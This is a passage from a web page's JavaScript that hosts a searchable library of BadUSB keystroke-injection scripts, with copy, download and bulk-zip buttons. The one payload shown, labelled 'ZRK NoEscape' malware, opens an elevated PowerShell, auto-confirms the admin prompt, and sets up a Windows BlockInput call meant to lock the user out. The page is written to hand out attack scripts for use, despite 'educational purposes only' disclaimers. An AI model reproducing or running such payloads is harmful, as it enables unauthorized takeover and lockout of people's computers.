                category: "Malware",
                description: "A dangerous malware that locks the user out of their system.",
                code: `REM !!!WARNING!!! This script is extremely dangerous and should never be used without explicit permission.
REM It can cause permanent damage to the target system. For educational purposes only.

DELAY 2000
GUI r
DELAY 500
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 1000
STRING $code = @"
STRING using System;
STRING using System.Runtime.InteropServices;
STRING public class Locker {
STRING     [DllImport("user32.dll")]
STRING     public static extern bool BlockInput(bool fBlockIt);
STRING }
STRING "@
STRING Add-Type -TypeDefinition $code -Language CSharp

ENTER

REM This script is part of the ZRK NoEscape attack simulation.
REM It demonstrates the potential severity of malicious scripts.
REM Never run this on systems without proper authorization.`
            },
            // Add more attack objects as needed
        ];

        function displayAttacks(filteredAttacks = attacks) {
            const attackList = document.getElementById('attackList');
            attackList.innerHTML = '';

            filteredAttacks.forEach(attack => {
                const attackItem = document.createElement('div');
                attackItem.className = `attack-item${attack.name === "ZRK NoEscape" ? " zrk-noescape" : ""}`;
                attackItem.innerHTML = `
                    <div class="attack-header">
                        <h3 class="attack-name">${attack.name}</h3>
                        <p class="attack-category">${attack.category}</p>
                    </div>
                    <div class="attack-content">
                        <p class="attack-description">${attack.description}</p>
                        <pre class="attack-code">${attack.code}
                            <button class="copy-btn">Copy</button>
                            <button class="download-btn">Download</button>
                        </pre>
                    </div>
                `;

                const copyBtn = attackItem.querySelector('.copy-btn');
                copyBtn.addEventListener('click', () => {
                    navigator.clipboard.writeText(attack.code);
                    copyBtn.textContent = 'Copied!';
                    setTimeout(() => {
                        copyBtn.textContent = 'Copy';
                    }, 2000);
                });

                const downloadBtn = attackItem.querySelector('.download-btn');
                downloadBtn.addEventListener('click', () => {
                    const blob = new Blob([attack.code], {type: 'text/plain'});
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `${attack.name.replace(/\s+/g, '_').toLowerCase()}.txt`;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                });

                attackList.appendChild(attackItem);
            });
        }

        function populateCategories() {
            const categories = [...new Set(attacks.map(attack => attack.category))];
            const categoriesContainer = document.getElementById('categories');

            categories.forEach(category => {
                const categoryBtn = document.createElement('button');
                categoryBtn.className = 'category';
                categoryBtn.textContent = category;
                categoryBtn.addEventListener('click', () => {
                    const filteredAttacks = attacks.filter(attack => attack.category === category);
                    displayAttacks(filteredAttacks);
                });
                categoriesContainer.appendChild(categoryBtn);
            });
        }

        const searchInput = document.getElementById('search');
        searchInput.addEventListener('input', () => {
            const searchTerm = searchInput.value.toLowerCase();
            const filteredAttacks = attacks.filter(attack => 
                attack.name.toLowerCase().includes(searchTerm) || 
                attack.description.toLowerCase().includes(searchTerm) ||
                attack.category.toLowerCase().includes(searchTerm)
            );
            displayAttacks(filteredAttacks);
        });

        const downloadAllBtn = document.getElementById('downloadAllBtn');
        downloadAllBtn.addEventListener('click', () => {
            const zip = new JSZip();
            attacks.forEach(attack => {
                zip.file(`${attack.name.replace(/\s+/g, '_').toLowerCase()}.txt`, attack.code);
            });
            zip.generateAsync({type: "blob"}).then(function(content) {
                saveAs(content, "zrk_badusb_scripts.zip");
            });
        });

        populateCategories();
        displayAttacks();
    </script>
